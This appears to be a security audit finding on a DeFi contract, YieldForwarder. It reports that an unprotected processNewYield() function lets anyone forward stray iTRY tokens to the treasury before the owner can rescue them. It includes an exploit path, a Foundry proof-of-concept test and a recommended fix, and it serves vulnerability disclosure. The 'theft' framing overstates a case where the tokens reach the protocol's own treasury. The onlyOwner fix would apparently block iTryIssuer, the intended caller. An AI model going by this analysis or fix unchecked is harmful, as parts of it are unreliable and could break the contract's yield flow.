## Title
YieldForwarder Race Condition: Unprotected processNewYield() Allows Token Theft and Yield Accounting Errors

## Summary
The `processNewYield()` function in YieldForwarder lacks access control, allowing any external caller to forward tokens held by the contract to the yield recipient. This creates a race condition with the owner's `rescueToken()` function when non-yield tokens exist in the contract, leading to accounting errors and potential theft of accidentally transferred tokens.

## Impact
**Severity**: Medium

## Finding Description

**Location:** `src/protocol/YieldForwarder.sol` - `processNewYield()` function [1](#0-0) 

**Intended Logic:** The YieldForwarder is designed to receive yield tokens from iTryIssuer and forward them to a designated recipient (treasury). The intended flow is that `iTryIssuer.processAccumulatedYield()` mints yield to YieldForwarder and calls `processNewYield()` atomically. [2](#0-1) 

The `rescueToken()` function is provided for the owner to recover tokens that were accidentally sent to the contract. [3](#0-2) 

**Actual Logic:** The `processNewYield()` function has no access control modifier - it's a public `external` function that anyone can call. This means any actor can call it with any amount parameter, attempting to forward tokens as "yield" regardless of whether they are legitimate yield or not.

**Exploitation Path:**

1. **Scenario Setup**: YieldForwarder accumulates iTRY tokens from a non-yield source (accidental transfer, dust from previous operations, or any external transfer). Balance: 100 iTRY.

2. **Transaction A (Block N)**: Owner observes unexpected tokens and calls `rescueToken(address(iTRY), owner, 100)` to recover them.

3. **Transaction B (Block N, different transaction)**: Attacker (or any actor) front-runs by calling `processNewYield(100)` directly on YieldForwarder.

4. **Race Outcome**: 
   - If Transaction B executes first: 100 iTRY are forwarded to treasury as "yield" (even though they're not legitimate yield)
   - If Transaction A executes first: 100 iTRY are rescued by owner (correct behavior)

**Security Property Broken:** This violates yield accounting integrity. The protocol tracks legitimate yield distribution through the `YieldDistributed` event in iTryIssuer, but tokens forwarded via unauthorized `processNewYield()` calls bypass this accounting, creating a mismatch between recorded yield and actual treasury receipts. [4](#0-3) 

## Impact Explanation

- **Affected Assets**: iTRY tokens held in YieldForwarder contract, treasury accounting for yield receipts
- **Damage Severity**: 
  - Direct loss: Owner loses ability to rescue accidentally-sent tokens, which go to treasury instead
  - Accounting error: Treasury receives iTRY that was never calculated as yield by iTryIssuer, breaking off-chain tracking
  - The treasury address is the yieldRecipient per deployment configuration [5](#0-4) 

- **User Impact**: Any tokens accidentally sent to YieldForwarder can be claimed by any actor before the owner can rescue them, causing unintended yield distribution

## Likelihood Explanation

- **Attacker Profile**: Any external actor (no privileges required) - can be a malicious attacker or even a well-intentioned user
- **Preconditions**: 
  - YieldForwarder must have iTRY token balance from sources other than the official yield flow
  - This can occur from accidental transfers, dust accumulation, or incomplete operations
- **Execution Complexity**: Single transaction - attacker simply calls `processNewYield(amount)` when they observe tokens in YieldForwarder
- **Frequency**: Can be exploited whenever non-yield tokens exist in the contract, creating a continuous race with any rescue attempts

## Recommendation

Add access control to `processNewYield()` to ensure it can only be called by authorized yield distributors:

```solidity
// In src/protocol/YieldForwarder.sol, function processNewYield, line 97:

// CURRENT (vulnerable):
// function processNewYield(uint256 _newYieldAmount) external override {

// FIXED:
function processNewYield(uint256 _newYieldAmount) external override onlyOwner {
    if (_newYieldAmount == 0) revert CommonErrors.ZeroAmount();
    if (yieldRecipient == address(0)) revert RecipientNotSet();

    // Transfer yield tokens to the recipient
    if (!yieldToken.transfer(yieldRecipient, _newYieldAmount)) {
        revert CommonErrors.TransferFailed();
    }

    emit YieldForwarded(yieldRecipient, _newYieldAmount);
}
```

Alternative mitigation: Implement a whitelist of authorized callers (e.g., only iTryIssuer address) that can call `processNewYield()`.

## Proof of Concept

```solidity
// File: test/Exploit_YieldForwarderRace.t.sol
// Run with: forge test --match-test test_YieldForwarderRaceCondition -vvv

pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/protocol/YieldForwarder.sol";
import "../src/token/iTRY/iTry.sol";
import "./mocks/MockERC20.sol";

contract Exploit_YieldForwarderRace is Test {
    YieldForwarder public forwarder;
    MockERC20 public yieldToken;
    
    address public owner;
    address public treasury;
    address public attacker;
    address public accidentalSender;
    
    function setUp() public {
        owner = makeAddr("owner");
        treasury = makeAddr("treasury");
        attacker = makeAddr("attacker");
        accidentalSender = makeAddr("accidentalSender");
        
        // Deploy yield token
        yieldToken = new MockERC20("iTRY", "iTRY");
        
        // Deploy forwarder as owner
        vm.prank(owner);
        forwarder = new YieldForwarder(address(yieldToken), treasury);
    }
    
    function test_YieldForwarderRaceCondition() public {
        // SETUP: Accidental transfer to YieldForwarder
        uint256 accidentalAmount = 100e18;
        yieldToken.mint(accidentalSender, accidentalAmount);
        
        vm.prank(accidentalSender);
        yieldToken.transfer(address(forwarder), accidentalAmount);
        
        assertEq(yieldToken.balanceOf(address(forwarder)), accidentalAmount, "YieldForwarder should have accidental tokens");
        
        // EXPLOIT: Attacker front-runs owner's rescue attempt
        // Attacker calls processNewYield() to forward tokens as "yield"
        vm.prank(attacker);
        forwarder.processNewYield(accidentalAmount);
        
        // VERIFY: Tokens went to treasury instead of being rescued
        assertEq(yieldToken.balanceOf(treasury), accidentalAmount, "Treasury received tokens as 'yield'");
        assertEq(yieldToken.balanceOf(address(forwarder)), 0, "YieldForwarder now empty");
        
        // Owner's rescue attempt would now fail (no tokens left)
        vm.prank(owner);
        vm.expectRevert(); // Will revert due to insufficient balance
        forwarder.rescueToken(address(yieldToken), owner, accidentalAmount);
        
        console.log("Vulnerability confirmed: Attacker forced accidental tokens to be forwarded as yield");
        console.log("Treasury balance (should be 0, but is):", yieldToken.balanceOf(treasury));
    }
    
    function test_RaceCondition_OwnerLoses() public {
        // Demonstrate the race: If attacker's tx is included first, owner loses
        uint256 amount = 50e18;
        yieldToken.mint(address(forwarder), amount);
        
        uint256 treasuryBefore = yieldToken.balanceOf(treasury);
        
        // Attacker transaction executes first (same block, earlier in tx ordering)
        vm.prank(attacker);
        forwarder.processNewYield(amount);
        
        // Verify: Treasury got the tokens
        assertEq(
            yieldToken.balanceOf(treasury),
            treasuryBefore + amount,
            "Race condition: Attacker won, tokens forwarded as yield"
        );
    }
}
```

## Notes

The vulnerability stems from the permissionless nature of `processNewYield()`. While the intended use case has iTryIssuer calling this function immediately after minting (atomically in the same transaction), the lack of access control means the function can be called independently by anyone, at any time, with any amount parameter.

This creates two problems:

1. **Race Condition**: When non-yield tokens exist in YieldForwarder (however they arrived), both `rescueToken()` and `processNewYield()` can act on them, with unpredictable outcomes based on transaction ordering.

2. **Accounting Error**: Tokens forwarded via unauthorized `processNewYield()` calls are treated as yield by the recipient (treasury), but were never recorded in iTryIssuer's `YieldDistributed` event, breaking the protocol's yield accounting system.

The interface documentation confirms this is unintended behavior, as it states "The iTryIssuer contract calls `processNewYield` when accumulated yield is minted," implying this should be the only caller. [6](#0-5)

### Citations

**File:** src/protocol/YieldForwarder.sol (L97-107)
```text
    function processNewYield(uint256 _newYieldAmount) external override {
        if (_newYieldAmount == 0) revert CommonErrors.ZeroAmount();
        if (yieldRecipient == address(0)) revert RecipientNotSet();

        // Transfer yield tokens to the recipient
        if (!yieldToken.transfer(yieldRecipient, _newYieldAmount)) {
            revert CommonErrors.TransferFailed();
        }

        emit YieldForwarded(yieldRecipient, _newYieldAmount);
    }
```

**File:** src/protocol/YieldForwarder.sol (L156-170)
```text
    function rescueToken(address token, address to, uint256 amount) external onlyOwner nonReentrant {
        if (to == address(0)) revert CommonErrors.ZeroAddress();
        if (amount == 0) revert CommonErrors.ZeroAmount();

        if (token == address(0)) {
            // Rescue ETH
            (bool success,) = to.call{value: amount}("");
            if (!success) revert CommonErrors.TransferFailed();
        } else {
            // Rescue ERC20 tokens
            IERC20(token).safeTransfer(to, amount);
        }

        emit TokensRescued(token, to, amount);
    }
```

**File:** src/protocol/iTryIssuer.sol (L398-420)
```text
    function processAccumulatedYield() external onlyRole(_YIELD_DISTRIBUTOR_ROLE) returns (uint256 newYield) {
        // Get current NAV price
        uint256 navPrice = oracle.price();
        if (navPrice == 0) revert InvalidNAVPrice(navPrice);

        // Calculate total collateral value: totalDLFUnderCustody * currentNAVPrice / 1e18
        uint256 currentCollateralValue = _totalDLFUnderCustody * navPrice / 1e18;

        // Calculate yield: currentCollateralValue - _totalIssuedITry
        if (currentCollateralValue <= _totalIssuedITry) {
            revert NoYieldAvailable(currentCollateralValue, _totalIssuedITry);
        }
        newYield = currentCollateralValue - _totalIssuedITry;

        // Mint yield amount to yieldReceiver contract
        _mint(address(yieldReceiver), newYield);

        // Notify yield distributor of received yield
        yieldReceiver.processNewYield(newYield);

        // Emit event
        emit YieldDistributed(newYield, address(yieldReceiver), currentCollateralValue);
    }
```

**File:** script/deploy/hub/02_DeployProtocol.s.sol (L188-195)
```text
    function _getYieldForwarderBytecode(address itryToken) internal view returns (bytes memory) {
        return abi.encodePacked(
            type(YieldForwarder).creationCode,
            abi.encode(
                itryToken, // yieldToken
                treasuryAddress // initialRecipient
            )
        );
```

**File:** src/protocol/periphery/IYieldProcessor.sol (L34-36)
```text
     * @dev This function is called by the iTryIssuer contract after minting yield tokens.
     *      The implementing contract should already have received the yield tokens before
     *      this function is called. Implementations must handle the yield appropriately
```
